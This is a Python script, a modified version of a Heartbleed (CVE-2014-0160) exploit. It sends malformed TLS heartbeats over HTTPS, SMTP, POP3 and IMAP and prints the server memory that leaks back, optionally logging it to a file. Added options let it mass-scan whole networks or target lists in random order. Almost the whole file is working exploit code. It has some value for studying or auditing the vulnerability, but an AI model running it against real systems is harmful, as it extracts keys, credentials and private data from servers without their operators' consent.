#!/usr/bin/env python

# I've added some features to the original work of Jared Stafford.
#
# -t parameter to optimize the timeout in seconds.
# -f parameter to log the memleak of vulnerable systems.
# -n parameter to scan entire network.
# -i parameter to scan from a list file. Useful if you already have targets.
# -r parameter to randomize the IP addresses to avoid linear scanning.
# -s parameter to exploit services that requires plaintext command to start SSL/TLS (HTTPS/SMTP/POP3/IMAP)
#
# Added socket error handler which causes the original version to exit in cases.
#
# hybridus (hybridus@gmail.com)
# CVE-2014-0160

import sys
import struct
import socket
import time
import select
import re
import errno
import Queue
import threading
import pprint
from optparse import OptionParser
from netaddr import *
from socket import error as socket_error
from random import shuffle


options = OptionParser(usage='%prog network(cidr) [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-t', '--timeout',type='int', default=5, help='Socket timeout setting in seconds (default: 5)')
options.add_option('-f', '--file',type='string', default='', help='Write leaked memory to file (default: none)')
options.add_option('-n', '--network',type='string', default='', help='Network you want to scan in CDIR (192.168.1.0/24)')
options.add_option('-i', '--input', type='string', default='', help='Get the target IP addresses from a list file')
options.add_option('-r', '--random', action='store_true', dest='random', default='True', help='Randomize the IP addresses to scan (default: false)')
options.add_option('-s', '--service', type='string', default='HTTPS', help='For some services commands are required to start SSL/TLS session. (HTTPS/SMTP/POP/IMAP)')

def h2bin(x):
	return x.replace(' ', '').replace('\n', '').decode('hex')

version = []
version.append(['SSL 3.0','03 00'])
version.append(['TLS 1.0','03 01'])
version.append(['TLS 1.1','03 02'])
version.append(['TLS 1.2','03 03'])

def create_hello(version):
	hello = h2bin('16 ' + version + ' 00 dc 01 00 00 d8 ' + version + ''' 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')
	return hello

def create_hb(version):
	hb = h2bin('18 ' + version + ' 00 03 01 40 00')
	return hb

def hexdump(s,logfilename, target_ip):
	for b in xrange(0, len(s), 16):
		lin = [c for c in s[b : b + 16]]
		hxdat = ' '.join('%02X' % ord(c) for c in lin)
		pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)

		if logfilename != '':
			try :
				with open(logfilename,'a') as logfile:
					logfile.write(target_ip + '\t' + pdat + '\n')
			except IOError:
				print 'Error writing dumps from ' + target_ip + ' to file. Setting file option NULL and resuming scan.'		
		print '  %04x: %-48s %s' % (b, hxdat, pdat)
	print

def recvall(s, length, timeout=5):
	endtime = time.time() + timeout
	rdata = ''
	remain = length
	while remain > 0:
		rtime = endtime - time.time()
		if rtime < 0:
			return None
		r, w, e = select.select([s], [], [], 5)
		if s in r:
			data = s.recv(remain)
			# EOF?
			if not data:
				return None
			rdata += data
			remain -= len(data)
	return rdata


def recvmsg(s,target_ip):
	hdr = recvall(s, 5)
	if hdr is None:
		print '[ ' + str(target_ip) + ' ] Unexpected EOF receiving record header - Host closed connection'
		return None, None, None
	typ, ver, ln = struct.unpack('>BHH', hdr)
	pay = recvall(s, ln, 10)
	if pay is None:
		print '[ ' + str(target_ip) + ' ] Unexpected EOF receiving record payload - Host closed connection'
		return None, None, None
	print '[ ' + str(target_ip) + ' ] <3 Received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
	return typ, ver, pay

def hit_hb(s,hb,target_ip,logfilename):
	s.send(hb)
	while True:
		typ, ver, pay = recvmsg(s,target_ip)
		if typ is None:
			print '[ ' + str(target_ip) + ' ] No heartbeat response received, server likely not vulnerable'
			return False

		if typ == 24:
			print '[ ' + str(target_ip) + ' ] <3 Received heartbeat response:'
			hexdump(pay, logfilename, target_ip)

			if len(pay) > 3:
				beep()
				print '[ ' + str(target_ip) + ' ] WARNING: server returned more data than it should - server is vulnerable!'
			else:
				print '[ ' + str(target_ip) + ' ] Server processed malformed heartbeat, but did not return any extra data.'
			return True

		if typ == 21:
			print 'Received alert:'
			hexdump(pay, logfilename, target_ip)
			print '[ ' + str(target_ip) + ' ] Server returned error, likely not vulnerable'
			return False
def beep():
    print "\a"

def main():
	opts, args = options.parse_args()
	if (len(args) < 1) and (opts.input == '') and (opts.network == '') :
		options.print_help()
		return

	if (opts.input != ''):
		with open(opts.input,'r') as inputfile:
			targetlist=inputfile.read().splitlines()
		print "Starting to scan hosts from " + opts.input +  ", " + str(len(targetlist)) + " host(s) in total."
	elif (opts.network != ''):
		targetlist = IPNetwork(opts.network)
		print "Starting to scan network " + str(targetlist.network) + " netmask " + str(targetlist.netmask) + ", " + str(targetlist.size) + " host(s) in total."
		targetlist = list(targetlist)
	elif (args[0]):
		targetlist = []
		targetlist.append(args[0])

	if (opts.service == '' or opts.service == 'HTTPS'):
		command1 = ''
		command2 = ''
	elif (opts.service == 'SMTP'):
		command1 = 'EHLO domain.net\n'
		command2 = 'STARTTLS\n'
	elif (opts.service == 'POP3'):
		command1 = 'CAPA\n'
		command2 = 'STLS\n'
	elif (opts.service == 'IMAP'):
		command1 = 'a001 CAPB\n'
		command2 = 'a002 STARTTLS\n'
	else:
		print 'Unknown service definiton'
		return


	totalhosts = len(targetlist)
	logfilename = opts.file
	target_ip = ''
	ip_count = 0
	if (opts.random == True):
		shuffle(targetlist)

	for x in range(int(len(targetlist))):
		target_ip = targetlist[x]
		ip_count += 1
		for i in range(len(version)):
			try:
				print '[ Scanning '+str(ip_count)+'/'+str(totalhosts)+' ]'
				print '[ ' + str(target_ip) + ' ] Trying ' + version[i][0] + '...'
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(float(opts.timeout))
	
				print '[ ' + str(target_ip) + ' ] Connecting...'
				sys.stdout.flush()
				s.connect((str(target_ip), opts.port))
				
				if (command1 != '' and command2 != ''):
					print '[ ' + str(target_ip) + ' ] Sending command to switch ' + opts.service + ' protocol over SSL/TLS and waiting for 1 second to be sure'
					s.send(command1)
					s.send(command2)
					time.sleep(1)

				print '[ ' + str(target_ip) + ' ] Sending Client Hello...'
				sys.stdout.flush()
				s.send(create_hello(version[i][1]))
				print '[ ' + str(target_ip) + ' ] Waiting for Server Hello...'
				sys.stdout.flush()
	
				while True:
					typ, ver, pay = recvmsg(s,target_ip)
					if typ == None:
						print '[ ' + str(target_ip) + ' ] Server closed connection without sending Server Hello.'
						break
					# Look for server hello done message.
					if typ == 22 and ord(pay[0]) == 0x0E:
						break
		
				print '[ ' + str(target_ip) + ' ] Sending heartbeat request...'
				sys.stdout.flush()
				s.send(create_hb(version[i][1]))
				if hit_hb(s,create_hb(version[i][1]),str(target_ip),logfilename):
					#Stop if vulnerable
					break
			except socket_error as serr:
				#e = sys.exc_info()[0]
				#print e
				if serr.errno == errno.ECONNREFUSED:
					print '[ ' + str(target_ip) + ' ] Refused connection.'
				if serr.errno == errno.EHOSTDOWN:
					print '[ ' + str(target_ip) + ' ] Host down.'
				if serr.errno == errno.ETIMEDOUT:
					print '[ ' + str(target_ip) + ' ] Connection timed out.'
				if serr.errno == errno.ECONNRESET:
					print '[ ' + str(target_ip) + ' ] Connection reset by peer.'
				if serr.errno == errno.EPIPE:
					print '[ ' + str(target_ip) + ' ] Pipe error.'

if __name__ == '__main__':
	main()
